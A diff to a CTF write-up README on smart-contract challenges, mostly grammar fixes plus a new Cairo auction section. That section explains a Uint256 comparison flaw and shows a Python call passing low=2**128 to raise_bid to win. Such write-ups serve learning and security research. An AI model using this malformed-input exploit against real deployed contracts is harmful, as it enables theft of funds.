@@ -24,6 +24,7 @@ I plan to add exploits for challenges that could not be solved soon.
 - [Cairo](#cairo)
   - [RIDDLE-OF-THE-SPHINX](#riddle-of-the-sphinx)
   - [CAIRO-PROXY](#cairo-proxy)
+  - [CAIRO-AUCTION](#cairo-auction)
 - [Solana](#solana)
   - [OTTERWORLD](#otterworld)
   - [OTTERSWAP](#otterswap)
@@ -35,7 +36,7 @@ I plan to add exploits for challenges that could not be solved soon.
 ### LOCKBOX2
 [Challenge & Exploit](Lockbox2)
 
-A same calldata can be sent to five functions from `stage1` to `stage5`. The goal is to satisfy the conditions of all functions.
+A common calldata can be sent to five functions from `stage1` to `stage5`. The goal is to satisfy the conditions in all functions.
 
 **stage1**
 ```solidity
@@ -43,7 +44,7 @@ function stage1() external pure {
     require(msg.data.length < 500);
 }
 ```
-This is easy.
+This condition is easy, but we need to build a calldata to satisfy it at other stages.
 
 **stage2**
 ```solidity
@@ -101,7 +102,7 @@ function stage5() external {
     }
 }
 ```
-There are a few ways to distinct a `delegatecall` from a `call`. In this case I use the `GAS` opcode.
+There are a few ways to distinguish a `delegatecall` from a `call`. In this case I use the `GAS` opcode.
 
 Payload:
 ```
@@ -157,7 +158,7 @@ Flag: `PCTF{10ck80x_20ck5}`
 ### MERKLEDROP
 [Challenge & Exploit](MerkleDrop)
 
-`claim` function of `MerkleDistributor` is vulnerable. 
+The `claim` function of `MerkleDistributor` is vulnerable. 
 ```solidity
 function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
     require(!isClaimed(index), "MerkleDistributor: Drop already claimed.");
@@ -283,7 +284,7 @@ Thus, for example, the following quine written in the Huff language does not sat
 }
 ```
 
-An quine satisfying the condition is as follows:
+A quine satisfying the condition is as follows:
 ```js
 #define macro MAIN() = takes (0) returns (0) {
     0x5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3 // code
@@ -319,7 +320,7 @@ $ erever -b "7f5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f35
 ```
 
 From `0x30`(`DUP1`):
-![](https://i.gyazo.com/b22488fe0b6ee943ac1c44a8fbfc28aa.png)
+![](https://i.gyazo.com/8bbe052898bc1e87e1a21857b17b8154.png)
 
 See also [evm.codes playground](https://www.evm.codes/playground?unit=Wei&codeType=Bytecode&code=%277f~y~y%27~zzzzz80x0w2w7f6z5b5b5by00053x41x00f3x60w152x%01wxyz~_).
 
@@ -338,7 +339,7 @@ Flag: `PCTF{QUiNE_QuiNe_qU1n3}`
 ### TRAPDOOOR 
 [Challenge & Exploit](Trapdooor)
 
-The goal is to get the environment variable `FLAG` in Forge script. 
+The goal is to get the environment variable `FLAG` in the Forge script. 
 
 This can be solved by using the Foundry cheatcodes and sending the flag to the specified RPC.
 
@@ -490,6 +491,91 @@ python exploit.py
 ```
 
 Flag: `PCTF{d3f4u17_pu811c_5721k35_4941n}`
+
+### CAIRO-AUCTION
+
+The goal is to win the auction.
+
+`Uint256` represents an integer in the range `[0, 2^256)` using two `felt` members.
+
+```cairo
+struct Uint256:
+    # The low 128 bits of the value.
+    member low : felt
+    # The high 128 bits of the value.
+    member high : felt
+end
+```
+
+The `raise_bid` function checks a balance as follows:
+
+```cairo
+let (current_balance) = _balances.read(account=caller)
+let (locked_balance) = _lockedBalancesOf.read(account=caller)
+let (unlocked_balance) = uint256_sub(current_balance, locked_balance)
+let (enough_balance) = uint256_le(amount, unlocked_balance)
+assert enough_balance = 1
+```
+
+However, if the `low` of `amount` is greater than or equal to `2**128` and the `high` of `amount` is zero, `uint256_le` always returns `1`.
+This is because the `is_nn` function used inside `uint256_le` always returns `1` unless the value of its argument is lower than `2**128`.
+
+```cairo
+func uint256_le{range_check_ptr}(a : Uint256, b : Uint256) -> (res : felt):
+    let (not_le) = uint256_lt(a=b, b=a)
+    return (1 - not_le)
+end
+```
+```cairo
+func uint256_lt{range_check_ptr}(a : Uint256, b : Uint256) -> (res : felt):
+    if a.high == b.high:
+        return is_le(a.low + 1, b.low)
+    end
+    return is_le(a.high + 1, b.high)
+end
+```
+```cairo
+func is_le{range_check_ptr}(a, b) -> (res : felt):
+    return is_nn(b - a)
+end
+```
+```cairo
+# Returns 1 if a >= 0 (or more precisely 0 <= a < RANGE_CHECK_BOUND).
+# Returns 0 otherwise.
+func is_nn{range_check_ptr}(a) -> (res : felt):
+    %{ memory[ap] = 0 if 0 <= (ids.a % PRIME) < range_check_builtin.bound else 1 %}
+    jmp out_of_range if [ap] != 0; ap++
+    [range_check_ptr] = a
+    let range_check_ptr = range_check_ptr + 1
+    return (res=1)
+
+    out_of_range:
+    %{ memory[ap] = 0 if 0 <= ((-ids.a - 1) % PRIME) < range_check_builtin.bound else 1 %}
+    jmp need_felt_comparison if [ap] != 0; ap++
+    assert [range_check_ptr] = (-a) - 1
+    let range_check_ptr = range_check_ptr + 1
+    return (res=0)
+
+    need_felt_comparison:
+    assert_le_felt(RC_BOUND, a)
+    return (res=0)
+end
+```
+
+Ref: https://github.com/starkware-libs/cairo-lang/blob/167b28bcd940fd25ea3816204fa882a0b0a49603/src/starkware/cairo/common/math_cmp.cairo
+
+
+Therefore, if `low` is set to `2**128` and execute `raise_bid`, `current_winner` can be updated.
+
+```py
+invocation = await auction_contract.functions["raise_bid"].invoke(1, {"low": 2**128, "high": 0}, max_fee=int(1e16))
+await invocation.wait_for_acceptance()
+```
+
+**Exploit**
+```
+python exploit.py
+```
 
 ## Solana
 
